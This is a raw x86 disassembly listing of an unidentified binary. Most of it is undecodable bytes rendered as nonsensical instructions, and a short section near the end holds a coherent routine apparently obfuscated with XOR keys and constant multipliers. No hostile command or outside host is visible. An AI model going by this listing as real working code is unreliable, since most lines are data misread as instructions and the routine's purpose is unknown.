  420786:	and    al,0x51
  420788:	jbe    0x4207cc
  42078a:	rcr    BYTE PTR [ebx],1
  42078c:	mov    ebx,0x4778dcba
  420791:	je     0x42073c
  420793:	mov    eax,ds:0x992e821c
  420798:	in     eax,dx
  420799:	sub    eax,0x34876ccc
  42079e:	fmul   st,st(7)
  4207a0:	jmp    0x420794
  4207a2:	sbb    eax,esi
  4207a4:	rol    DWORD PTR [edx+0x24],1
  4207a7:	imul   edi,DWORD PTR [ebp+0x7],0xffffff9a
  4207ab:	out    dx,al
  4207ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207ad:	shr    DWORD PTR [eax+0x3bb7a15c],cl
  4207b3:	cmp    cl,BYTE PTR [ecx]
  4207b5:	rcl    DWORD PTR [ebp-0x42],1
  4207b8:	out    0x57,eax
  4207ba:	pusha  
  4207bb:	bound  esi,QWORD PTR [edx-0x23d05704]
  4207c1:	dec    eax
  4207c2:	imul   ebp,edx,0x10
  4207c5:	sub    BYTE PTR [ecx],ah
  4207c7:	and    ebp,ecx
  4207c9:	push   cs
  4207ca:	out    0x0,eax
  4207cc:	ins    BYTE PTR es:[edi],dx
  4207cd:	std    
  4207ce:	add    dl,0x94
  4207d1:	inc    edi
  4207d2:	sbb    al,al
  4207d4:	lea    edx,[ebx]
  4207d6:	aad    0x8a
  4207d8:	ret    
  4207d9:	or     edi,DWORD PTR [edi+0x40847b01]
  4207df:	mov    ch,0x3c
  4207e1:	or     eax,0xfe385238
  4207e6:	adc    BYTE PTR [esi],ch
  4207e8:	cld    
  4207e9:	push   0xffffffd7
  4207eb:	inc    esp
  4207ec:	popf   
  4207ed:	popf   
  4207ee:	rcr    ch,1
  4207f0:	add    ecx,esi
  4207f2:	cmp    DWORD PTR [esi-0x28],esi
  4207f5:	mov    ah,0x6b
  4207f7:	popf   
  4207f8:	mov    al,0xf7
  4207fa:	pop    eax
  4207fb:	xlat   BYTE PTR ds:[ebx]
  4207fc:	sti    
  4207fd:	fnstcw WORD PTR [edi-0x39]
  420800:	inc    edx
  420801:	xchg   esp,eax
  420802:	arpl   ax,di
  420804:	jno    0x4207d9
  420806:	ror    DWORD PTR [ebx-0x44923203],cl
  42080c:	pop    ecx
  42080d:	add    al,0x14
  42080f:	jge    0x4207aa
  420811:	outs   dx,DWORD PTR ds:[esi]
  420812:	push   ebp
  420813:	lods   al,BYTE PTR ds:[esi]
  420814:	xlat   BYTE PTR ds:[ebx]
  420815:	arpl   WORD PTR [ebx],cx
  420817:	repnz push eax
  420819:	div    BYTE PTR [edx]
  42081b:	inc    eax
  42081c:	(bad)  
  42081d:	in     eax,dx
  42081e:	fstp   TBYTE PTR [ecx-0x6d]
  420821:	clc    
  420822:	sbb    al,0x9d
  420824:	xchg   esi,eax
  420825:	ss nop
  420827:	rcr    BYTE PTR [ebx],0xf5
  42082a:	cld    
  42082b:	les    edi,FWORD PTR [edx+0x5b]
  42082e:	jne    0x4208a3
  420830:	or     BYTE PTR [edx+eax*4+0x327454a1],ah
  420837:	jno    0x420828
  420839:	cld    
  42083a:	bound  ebp,QWORD PTR es:[ecx+edi*4+0x3b]
  42083f:	daa    
  420840:	inc    edi
  420841:	mov    bl,0xbd
  420843:	xchg   BYTE PTR [ebx+esi*1+0x70d85f07],ah
  42084a:	sub    DWORD PTR [edx-0x456ae209],esp
  420850:	stos   BYTE PTR es:[edi],al
  420851:	packsswb mm4,QWORD PTR [edi]
  420854:	lds    esp,FWORD PTR [edx]
  420856:	push   edx
  420857:	test   eax,0x16a7b7ec
  42085c:	add    BYTE PTR [ecx-0x2],dl
  42085f:	and    bh,al
  420861:	imul   esi,DWORD PTR [bp+di-0x59],0x2d
  420866:	xchg   ebx,eax
  420867:	push   ds
  420868:	jmp    0x453afc98
  42086d:	adc    eax,0xcee362f4
  420872:	repnz jmp 0xf57e:0x6802d9a7
  42087a:	adc    ah,BYTE PTR [edx]
  42087c:	add    BYTE PTR ds:0x2481174f,ch
  420882:	cld    
  420883:	out    0xce,eax
  420885:	mov    ds:0xe3004396,al
  42088a:	push   es
  42088b:	pop    edi
  42088c:	aas    
  42088d:	cwde   
  42088e:	jns    0x4208dd
  420890:	add    al,0x53
  420892:	hlt    
  420893:	iret   
  420894:	cmp    cl,BYTE PTR [ebp-0x35]
  420897:	or     BYTE PTR [edx],ah
  420899:	(bad)  
  42089b:	inc    eax
  42089c:	test   al,0x3a
  42089e:	add    esi,0xcc4c11e6
  4208a4:	sbb    BYTE PTR [esi],0xdc
  4208a7:	sub    BYTE PTR ds:0x15d0bcc8,bh
  4208ad:	out    dx,eax
  4208ae:	and    dh,BYTE PTR [ebp+0x20]
  4208b1:	lea    esi,[ecx+0x36631e3]
  4208b7:	pushf  
  4208b8:	push   0x921304dd
  4208bd:	pop    dx
  4208bf:	and    al,0xa4
  4208c1:	mov    ch,0x43
  4208c3:	dec    edx
  4208c4:	inc    ebp
  4208c5:	ja     0x4208f3
  4208c7:	out    0x7d,al
  4208c9:	out    0x2,al
  4208cb:	jl     0x4208f4
  4208cd:	test   DWORD PTR [eax],0xb38c0789
  4208d3:	int    0xba
  4208d5:	retf   0x5897
  4208d8:	mov    ch,ah
  4208da:	outs   dx,DWORD PTR ds:[esi]
  4208db:	jge    0x420879
  4208dd:	or     eax,0x9078d84f
  4208e2:	call   0xa8a65b96
  4208e7:	int3   
  4208e8:	xor    eax,DWORD PTR [edi-0x58]
  4208eb:	jns    0x420953
  4208ed:	pop    esi
  4208ee:	cs repz sbb eax,0x4ae009dd
  4208f5:	aaa    
  4208f6:	lock outs dx,DWORD PTR ds:[esi]
  4208f8:	iret   
  4208f9:	sub    esp,esi
  4208fb:	jno    0x4208e0
  4208fd:	hlt    
  4208fe:	fldcw  WORD PTR [ebx+eax*1-0x33f4a21d]
  420905:	dec    esi
  420906:	pop    ds
  420907:	dec    ebx
  420908:	mov    al,0x28
  42090a:	(bad)  [edi-0x2d]
  42090d:	sbb    eax,0xd6bb9bd6
  420912:	mov    bl,0x4
  420914:	xchg   ebp,eax
  420915:	aad    0xfd
  420917:	push   ds
  420918:	in     eax,dx
  420919:	and    ch,BYTE PTR [eax-0x7f384768]
  42091f:	sub    al,0x0
  420921:	adc    eax,0xb86d185
  420926:	fdivr  QWORD PTR [edx+0x39746f0b]
  42092c:	enter  0x8af5,0x75
  420930:	sub    cl,0x3c
  420933:	mov    esp,0xf0860e58
  420938:	and    BYTE PTR [ebx-0x362cc891],0xcb
  42093f:	icebp  
  420940:	push   eax
  420941:	nop
  420942:	adc    BYTE PTR [edx+0x9],dh
  420945:	aas    
  420946:	bound  eax,QWORD PTR [ebp+0x3e6464f0]
  42094c:	rcr    BYTE PTR [edx],1
  42094e:	adc    ebx,DWORD PTR [edi+0x51]
  420951:	fwait
  420952:	out    dx,eax
  420953:	mul    bl
  420955:	sbb    al,0x4d
  420957:	stos   BYTE PTR es:[edi],al
  420958:	(bad)  
  420959:	mov    dl,0x63
  42095b:	add    DWORD PTR [ecx+0x360a9bf1],eax
  420961:	adc    edi,DWORD PTR [esi+0x6e]
  420964:	cmp    al,0xbe
  420966:	(bad)  
  420967:	sbb    esi,esi
  420969:	fwait
  42096a:	test   BYTE PTR [eax],al
  42096c:	mov    al,0x14
  42096e:	add    eax,0x7585bf75
  420973:	fstp   TBYTE PTR [eax-0x1debed52]
  420979:	fistp  WORD PTR [ebp-0x5c100d9]
  42097f:	mov    BYTE PTR [esi],dl
  420981:	lods   al,BYTE PTR ds:[esi]
  420982:	and    eax,DWORD PTR [eax+ebx*4]
  420985:	mov    dh,0xdb
  420987:	jmp    0xddc8:0x54a6543e
  42098e:	or     eax,0xcaa3e935
  420993:	repz fimul WORD PTR [edi+0x6a8bdb2b]
  42099a:	ds dec esp
  42099c:	(bad)  
  42099d:	test   al,0xa4
  42099f:	cmp    BYTE PTR [edx+0x19],ah
  4209a2:	xchg   ebp,eax
  4209a3:	and    dh,BYTE PTR [eax]
  4209a5:	xlat   BYTE PTR cs:[ebx]
  4209a7:	adc    al,0xe3
  4209a9:	les    esp,FWORD PTR [edx+eax*2+0x22f13216]
  4209b0:	or     cl,dl
  4209b2:	mov    eax,0x5bb60f45
  4209b7:	inc    ebx
  4209b8:	mov    esi,0x411921c0
  4209bd:	push   cs
  4209be:	push   eax
  4209bf:	push   esp
  4209c0:	mov    edx,DWORD PTR [ebx+eiz*8+0x51]
  4209c4:	cmp    edx,eax
  4209c6:	cld    
  4209c7:	mov    ss,WORD PTR [edx-0x10]
  4209ca:	pminsw mm5,QWORD PTR [edx+0x6e]
  4209ce:	ja     0xb0d9c90f
  4209d4:	rcl    DWORD PTR [edi-0x68f113d4],0xa0
  4209db:	in     al,0x5d
  4209dd:	(bad)  
  4209df:	mov    esp,0x8a70b5fd
  4209e4:	fsubr  QWORD PTR [ebp-0x3a950a3a]
  4209ea:	dec    eax
  4209eb:	sub    ch,BYTE PTR [ebp-0x25cfc936]
  4209f1:	cmp    edx,ecx
  4209f3:	jmp    0xd1af2d5c
  4209f8:	inc    ebp
  4209f9:	push   ebx
  4209fa:	(bad)  
  4209fb:	out    0x64,al
  4209fd:	inc    esi
  4209fe:	pop    es
  4209ff:	in     al,0xba
  420a01:	pop    ds
  420a02:	ror    BYTE PTR [eax+ecx*2],1
  420a05:	pop    esp
  420a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a07:	sub    edx,DWORD PTR [edi+0x1eed14fe]
  420a0d:	imul   esp,DWORD PTR [edi],0x69
  420a10:	cmp    eax,0xa0a4bcd0
  420a15:	mov    al,BYTE PTR [eax]
  420a17:	mov    ds:0x4271528b,eax
  420a1c:	test   eax,0x7f96195a
  420a21:	out    0x32,eax
  420a23:	mov    ecx,DWORD PTR [edx]
  420a25:	pusha  
  420a26:	sub    eax,0x685c9784
  420a2b:	pop    ds
  420a2c:	mov    edi,0xdd4c53fe
  420a31:	addr16 push edx
  420a33:	dec    ecx
  420a34:	mov    bh,0xa3
  420a36:	mov    edx,0xc7aa797d
  420a3b:	sbb    ebp,DWORD PTR [edi+ebx*2-0x69]
  420a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a40:	push   esi
  420a41:	stc    
  420a42:	lock jecxz 0x420a71
  420a45:	(bad)  
  420a46:	in     al,dx
  420a47:	jne    0x420a68
  420a49:	dec    DWORD PTR [edi+0x51692140]
  420a4f:	lods   al,BYTE PTR ds:[esi]
  420a50:	inc    esi
  420a51:	pushf  
  420a52:	enter  0x113a,0xd0
  420a56:	adc    dh,0x9e
  420a59:	call   0x5f6be9ab
  420a5e:	je     0x420a2b
  420a60:	adc    edi,DWORD PTR [eax]
  420a62:	push   ss
  420a63:	ins    BYTE PTR es:[edi],dx
  420a64:	test   al,0x20
  420a66:	pop    edx
  420a67:	sub    DWORD PTR ds:0xb488ee4c,edx
  420a6d:	cwde   
  420a6e:	mov    BYTE PTR [eax+0x57afa130],0xd5
  420a75:	nop
  420a76:	inc    esi
  420a77:	test   DWORD PTR [ebx+edi*1+0x75c0c7d9],ecx
  420a7e:	rcl    DWORD PTR [edi-0x44469571],cl
  420a84:	jp     0x420ac0
  420a86:	dec    ecx
  420a87:	adc    BYTE PTR [ebp+0x20bb80ff],dl
  420a8d:	ja     0x420ad6
  420a8f:	aas    
  420a90:	dec    edi
  420a91:	lods   eax,DWORD PTR ds:[esi]
  420a92:	es pop ebx
  420a94:	jo     0x420adb
  420a96:	ins    DWORD PTR es:[edi],dx
  420a97:	inc    ebx
  420a98:	sub    esi,DWORD PTR [ebx-0x504877e5]
  420a9e:	pop    edx
  420a9f:	cdq    
  420aa0:	icebp  
  420aa1:	fucom  st(3)
  420aa3:	inc    esi
  420aa4:	fwait
  420aa5:	mov    ds:0x5d00feff,al
  420aaa:	test   al,0xd4
  420aac:	int3   
  420aad:	cs mov ebx,0xe2f5b286
  420ab3:	stos   DWORD PTR es:[edi],eax
  420ab4:	adc    BYTE PTR [edi*1-0x5a5d41a],bh
  420abb:	mov    bl,0xfb
  420abd:	retf   0x91fe
  420ac0:	adc    esp,DWORD PTR [edx-0xc]
  420ac3:	jo     0x420a9a
  420ac5:	aaa    
  420ac6:	test   eax,0xdda627f3
  420acb:	pop    edi
  420acc:	test   al,0xe1
  420ace:	addr16 aas 
  420ad0:	lds    ecx,FWORD PTR [edx-0x57ff7ddf]
  420ad6:	dec    esi
  420ad7:	push   ss
  420ad8:	cmp    DWORD PTR [esi-0x29],edx
  420adb:	das    
  420adc:	pushf  
  420add:	cs mov esi,0xab41111d
  420ae3:	fstp   TBYTE PTR [edx-0x7d]
  420ae6:	xor    al,0x53
  420ae8:	retf   
  420ae9:	dec    esi
  420aea:	xor    DWORD PTR [ebp-0x71082615],ecx
  420af0:	not    BYTE PTR [ecx+0xb4de45a]
  420af6:	test   BYTE PTR [edi-0x3],ch
  420af9:	and    al,0xf3
  420afb:	xor    BYTE PTR [edi-0x194e26c5],0x37
  420b02:	jl     0x420b20
  420b04:	inc    ebx
  420b05:	mov    edx,0x3318f854
  420b0a:	cmp    al,0xce
  420b0c:	aam    0x7c
  420b0e:	daa    
  420b0f:	jns    0x420b00
  420b11:	cmp    ecx,DWORD PTR [edi+0x70fb2b5]
  420b17:	jl     0x420ad0
  420b19:	push   esp
  420b1a:	dec    ebp
  420b1b:	cmp    eax,0x7abbcb1b
  420b20:	cmp    ah,BYTE PTR [esi+ebp*2-0x387b3fc2]
  420b27:	inc    esi
  420b28:	pop    esi
  420b29:	xlat   BYTE PTR ds:[ebx]
  420b2a:	cmc    
  420b2b:	push   esi
  420b2c:	or     al,0x7a
  420b2e:	in     al,0x7e
  420b30:	arpl   WORD PTR [ecx+0x703b5022],di
  420b36:	rep outs dx,DWORD PTR ds:[esi]
  420b38:	pop    ecx
  420b39:	imul   ebx,DWORD PTR [eax],0xffffffa6
  420b3c:	mov    DWORD PTR [ecx],eax
  420b3e:	adc    al,0x40
  420b40:	push   esp
  420b41:	daa    
  420b42:	arpl   WORD PTR [ebx],si
  420b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b45:	mov    WORD PTR [edi+0x13],?
  420b48:	xor    ecx,DWORD PTR [edi-0x69]
  420b4b:	scas   al,BYTE PTR es:[edi]
  420b4c:	adc    DWORD PTR [esi+0x2afde352],ebp
  420b52:	imul   ecx,ecx,0xffffffbe
  420b55:	imul   esi,DWORD PTR [ecx],0x7e196c5b
  420b5b:	stos   DWORD PTR es:[edi],eax
  420b5c:	add    al,0x4e
  420b5e:	xchg   esp,eax
  420b5f:	out    0xce,eax
  420b61:	xlat   BYTE PTR ds:[ebx]
  420b62:	or     cl,BYTE PTR [ebx+0x1c]
  420b65:	jb     0x420b06
  420b67:	jae    0x420b02
  420b69:	outs   dx,BYTE PTR ds:[esi]
  420b6a:	pop    ds
  420b6b:	xchg   ch,al
  420b6d:	pushf  
  420b6e:	mov    ecx,0x3dccf330
  420b73:	fisttp DWORD PTR [ecx+esi*1]
  420b76:	mov    esi,0x173cb53c
  420b7b:	mov    eax,0x7e51ec7d
  420b80:	stos   DWORD PTR es:[edi],eax
  420b81:	mov    fs,edx
  420b83:	fcmove st,st(4)
  420b85:	mov    eax,ds:0xe23a3b7d
  420b8a:	pop    ecx
  420b8b:	or     eax,0xdb814190
  420b90:	aas    
  420b91:	repnz sahf 
  420b93:	and    ebx,esi
  420b95:	and    ebp,edx
  420b97:	pop    esi
  420b98:	dec    ebx
  420b99:	xlat   BYTE PTR ds:[ebx]
  420b9a:	scas   eax,DWORD PTR es:[edi]
  420b9b:	les    esi,FWORD PTR [edx+0x4612ced]
  420ba1:	in     eax,dx
  420ba2:	(bad)  
  420ba3:	lods   eax,DWORD PTR ds:[esi]
  420ba4:	scas   al,BYTE PTR es:[edi]
  420ba5:	jmp    0x8f9:0xab7c2812
  420bac:	lods   al,BYTE PTR ds:[esi]
  420bad:	or     DWORD PTR [eax+0x75],0x31
  420bb1:	into   
  420bb2:	lea    edx,[esi+0x10]
  420bb5:	adc    bh,BYTE PTR [eax-0x76d6bf14]
  420bbb:	jno    0x420b4c
  420bbd:	div    dl
  420bbf:	int3   
  420bc0:	mov    cl,al
  420bc2:	jp     0x420bac
  420bc4:	imul   esi,DWORD PTR [edi],0xb23f1fe0
  420bca:	test   BYTE PTR [esi],cl
  420bcc:	dec    edx
  420bcd:	iret   
  420bce:	sub    al,0x78
  420bd0:	je     0x420bd0
  420bd2:	(bad)  
  420bd3:	sub    eax,0xb054d62d
  420bd8:	int3   
  420bd9:	retf   0x1d04
  420bdc:	out    dx,eax
  420bdd:	push   ebp
  420bde:	sbb    DWORD PTR [edi+ebp*4-0x2245c58f],esp
  420be5:	fnstcw WORD PTR [ecx-0x539d85f5]
  420beb:	inc    edx
  420bec:	std    
  420bed:	adc    bh,BYTE PTR [ebx+0x208a059]
  420bf3:	and    eax,0xce8ceed5
  420bf8:	and    BYTE PTR [esi],bh
  420bfa:	cmc    
  420bfb:	xchg   esp,eax
  420bfc:	aas    
  420bfd:	fisubr DWORD PTR [edx+0x38]
  420c00:	icebp  
  420c01:	push   ss
  420c02:	xlat   BYTE PTR ds:[ebx]
  420c03:	arpl   WORD PTR [edx-0x38],bp
  420c06:	test   DWORD PTR [ebx-0x20],edi
  420c09:	cwde   
  420c0a:	or     al,0xe7
  420c0c:	mov    cl,0x16
  420c0e:	les    eax,FWORD PTR [ebp-0x57a5ee8e]
  420c14:	jns    0x420c86
  420c16:	in     al,0x74
  420c18:	xchg   esp,eax
  420c19:	fwait
  420c1a:	imul   eax,DWORD PTR [edx+esi*4-0x1d52c548],0x61aaeef4
  420c25:	imul   edi,DWORD PTR [edx],0x78bfddcd
  420c2b:	sbb    BYTE PTR [edi],al
  420c2d:	lds    ecx,FWORD PTR [ebx+0x3958685d]
  420c33:	leave  
  420c34:	sub    edx,DWORD PTR [edx+0x408985b9]
  420c3a:	inc    edx
  420c3b:	xchg   ebp,eax
  420c3c:	inc    ecx
  420c3d:	xor    eax,0x6ca9e626
  420c42:	sbb    ah,BYTE PTR [edx-0x390b2a63]
  420c48:	fdivrp st(7),st
  420c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c4b:	adc    eax,0x41ec829d
  420c50:	jl     0x420c63
  420c52:	iret   
  420c53:	mov    al,ds:0x64c227d5
  420c58:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  420c5a:	add    dh,BYTE PTR [ebp+eax*1-0x11c56e77]
  420c61:	ficom  DWORD PTR [esi+0x34a0254c]
  420c67:	dec    edx
  420c68:	cmp    eax,0xc0cd148c
  420c6d:	inc    edx
  420c6e:	cmp    BYTE PTR [esi+0x48],0x4b
  420c72:	inc    ebp
  420c73:	dec    esi
  420c74:	test   eax,0xd9f9dd36
  420c79:	sbb    eax,0xdae891a3
  420c7e:	adc    DWORD PTR [ebp-0x7e],0x74
  420c82:	push   0x89e76008
  420c87:	stos   BYTE PTR es:[edi],al
  420c88:	cmp    BYTE PTR [ebx+0x456762dd],bl
  420c8e:	cmp    DWORD PTR [eax+esi*1],eax
  420c91:	pand   mm2,mm3
  420c94:	push   ss
  420c95:	xor    esp,eax
  420c97:	ss or  ebx,esi
  420c9a:	out    0xb,al
  420c9c:	mov    ebp,0xcd9eacf9
  420ca1:	sbb    al,0xde
  420ca3:	icebp  
  420ca4:	mov    al,ds:0xdda29f80
  420ca9:	cwde   
  420caa:	cmp    BYTE PTR [edi],ch
  420cac:	out    dx,eax
  420cad:	pop    ebp
  420cae:	sbb    ecx,DWORD PTR [esi-0x382042e6]
  420cb4:	push   cs
  420cb5:	pop    esp
  420cb6:	and    ebx,DWORD PTR [ecx]
  420cb8:	and    bl,ah
  420cba:	jmp    0x998d:0x58e89635
  420cc1:	imul   esp,DWORD PTR [eax],0x7db2efe7
  420cc7:	pushf  
  420cc8:	cli    
  420cc9:	(bad)  
  420cca:	icebp  
  420ccb:	mov    esi,0xb51f59e9
  420cd0:	int    0x1c
  420cd2:	mov    ebx,es
  420cd4:	jp     0x420d3e
  420cd6:	push   ss
  420cd7:	jns    0x420d2f
  420cd9:	sti    
  420cda:	and    edx,DWORD PTR [ecx-0x1d888bf2]
  420ce0:	sub    eax,0xace38928
  420ce5:	add    bl,dl
  420ce7:	sbb    eax,0x3299a520
  420cec:	fwait
  420ced:	addr16 div esi
  420cf0:	in     eax,0xdc
  420cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cf3:	mov    dl,0x7f
  420cf5:	ds ds cmc 
  420cf8:	push   es
  420cf9:	jbe    0x420d25
  420cfb:	dec    eax
  420cfc:	ret    0xf819
  420cff:	xor    ebx,DWORD PTR [esi]
  420d01:	cwde   
  420d02:	lods   eax,DWORD PTR ds:[esi]
  420d03:	mov    al,ds:0x176a600e
  420d08:	xchg   ebx,eax
  420d0a:	or     BYTE PTR [edx-0x30],al
  420d0d:	jne    0x420cf8
  420d0f:	mov    edx,0x19278f87
  420d14:	cld    
  420d15:	mov    ah,0x33
  420d17:	sti    
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
